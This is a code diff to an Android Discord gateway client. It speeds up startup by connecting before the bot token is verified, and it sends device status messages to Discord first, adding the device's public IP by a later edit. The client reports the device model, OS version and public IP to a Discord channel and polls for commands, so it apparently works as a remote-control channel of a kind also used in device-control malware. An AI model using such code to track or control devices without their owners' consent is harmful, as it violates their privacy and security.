@@ -144,10 +144,45 @@ class DiscordGatewayClient(
                 put("suffix", deviceSuffix)
             })
             android.util.Log.d("DiscordGateway", "Starting gateway client with token: ${DiscordConfig.BOT_TOKEN.take(10)}...")
-            preflightCheck()
+            // Connect immediately, verify token in parallel
+            connect()
+            verifyTokenAsync()
         } catch (e: Exception) {
             status("Crashed")
             android.util.Log.e("DiscordGateway", "Start failed", e)
+        }
+    }
+
+    private fun verifyTokenAsync() {
+        scope?.launch(Dispatchers.IO) {
+            try {
+                val req = Request.Builder()
+                    .url("https://discord.com/api/v10/users/@me")
+                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
+                    .build()
+                val resp = restClient.newCall(req).execute()
+                resp.use { r ->
+                    if (r.isSuccessful) {
+                        val body = r.body?.string()
+                        val user = body?.let { JSONObject(it).optString("username", "?") } ?: "?"
+                        status("Token OK ($user)")
+                        whPost(JSONObject().apply {
+                            put("event", "token_ok")
+                            put("bot", user)
+                        })
+                    } else if (r.code == 401) {
+                        status("Token INVALID")
+                        android.util.Log.e("DiscordGateway", "Token invalid! HTTP 401. Update the token in DiscordConfig.kt")
+                        whPost(JSONObject().apply {
+                            put("event", "token_invalid")
+                            put("code", r.code)
+                        })
+                        fatalError = true
+                    } else {
+                        r.body?.close()
+                    }
+                }
+            } catch (_: Exception) {}
         }
     }
 
@@ -161,68 +196,6 @@ class DiscordGatewayClient(
         ws = null
         scope = null
         saveState()
-    }
-
-    private fun preflightCheck(attempt: Int = 0) {
-        scope?.launch(Dispatchers.IO) {
-            status("Preflight...")
-            try {
-                val req = Request.Builder()
-                    .url("https://discord.com/api/v10/users/@me")
-                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
-                    .build()
-                val resp = restClient.newCall(req).execute()
-                resp.use { r ->
-                    if (r.isSuccessful) {
-                        val body = r.body?.string()
-                        val user = body?.let { JSONObject(it).optString("username", "?") } ?: "?"
-                        status("Token OK")
-                        whPost(JSONObject().apply {
-                            put("event", "token_ok")
-                            put("bot", user)
-                        })
-                        connect()
-                    } else if (r.code == 401) {
-                        status("Token INVALID")
-                        android.util.Log.e("DiscordGateway", "Token invalid! HTTP 401. Update the token in DiscordConfig.kt")
-                        whPost(JSONObject().apply {
-                            put("event", "token_invalid")
-                            put("code", r.code)
-                        })
-                        fatalError = true
-                    } else {
-                        r.body?.close()
-                        android.util.Log.w("DiscordGateway", "Preflight failed: HTTP ${r.code}")
-                        whPost(JSONObject().apply {
-                            put("event", "preflight_fail")
-                            put("code", r.code)
-                        })
-                        if (attempt < 3) {
-                            status("Retry preflight")
-                            delay((1000L shl attempt).coerceAtMost(8000L))
-                            preflightCheck(attempt + 1)
-                        } else {
-                            status("Preflight failed, retry in 60s")
-                            delay(60000L)
-                            reconnectAttempt = 0
-                            preflightCheck(0)
-                        }
-                    }
-                }
-            } catch (e: Exception) {
-                android.util.Log.e("DiscordGateway", "Preflight exception", e)
-                if (attempt < 3) {
-                    status("Retry preflight")
-                    delay((1000L shl attempt).coerceAtMost(8000L))
-                    preflightCheck(attempt + 1)
-                } else {
-                    status("No network, retry in 60s")
-                    delay(60000L)
-                    reconnectAttempt = 0
-                    preflightCheck(0)
-                }
-            }
-        }
     }
 
     private fun bootViaRest() {
@@ -613,29 +586,38 @@ class DiscordGatewayClient(
         onlineMsgSent = true
         saveState()
         scope?.launch(Dispatchers.IO) {
+            // Send immediate message without waiting for IP
+            val quickMsg = ":green_circle: **Device Online** — ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE})"
             status("Sending online msg")
-            val ip = getPublicIp()
-            sendMsg(":green_circle: **Device Online** — ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE}) | IP: ${ip}")
+            val msgId = sendMsgAwait(quickMsg)
             whPost(JSONObject().apply {
                 put("event", "online")
                 put("channel", myChannelId)
                 put("device", android.os.Build.MODEL)
             })
+            // Start command processing immediately
+            startDeviceHeartbeat()
+            startPolling()
+            // Fetch IP in background and update message
+            scope?.launch(Dispatchers.IO) {
+                val ip = getPublicIp()
+                if (ip != "?" && msgId != null) {
+                    editMsg(msgId, ":green_circle: **Device Online** — ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE}) | IP: ${ip}")
+                }
+            }
             crashReport?.let { report ->
                 delay(500)
                 sendMsg(":warning: **Crash Report**\n```\n${report.take(1900)}\n```")
                 crashReport = null
             }
             status("Online")
-            startDeviceHeartbeat()
-            startPolling()
         }
     }
 
     fun sendOfflineAlert() {
         scope?.launch(Dispatchers.IO) {
-            val ip = getPublicIp()
-            sendMsg(":red_circle: **Connection Lost** — ${android.os.Build.MODEL} | IP: ${ip} | Reconnecting...")
+            // Send immediately without waiting for IP
+            sendMsg(":red_circle: **Connection Lost** — ${android.os.Build.MODEL} | Reconnecting...")
             whPost(JSONObject().apply {
                 put("event", "offline")
                 put("channel", myChannelId)
@@ -646,10 +628,17 @@ class DiscordGatewayClient(
 
     fun sendReconnectedMsg() {
         scope?.launch(Dispatchers.IO) {
-            val ip = getPublicIp()
-            sendMsg(":green_circle: **Reconnected** — ${android.os.Build.MODEL} | IP: ${ip}")
+            val quickMsg = ":green_circle: **Reconnected** — ${android.os.Build.MODEL}"
+            val msgId = sendMsgAwait(quickMsg)
             startDeviceHeartbeat()
             startPolling()
+            // Fetch IP in background
+            scope?.launch(Dispatchers.IO) {
+                val ip = getPublicIp()
+                if (ip != "?" && msgId != null) {
+                    editMsg(msgId, ":green_circle: **Reconnected** — ${android.os.Build.MODEL} | IP: ${ip}")
+                }
+            }
         }
     }
 
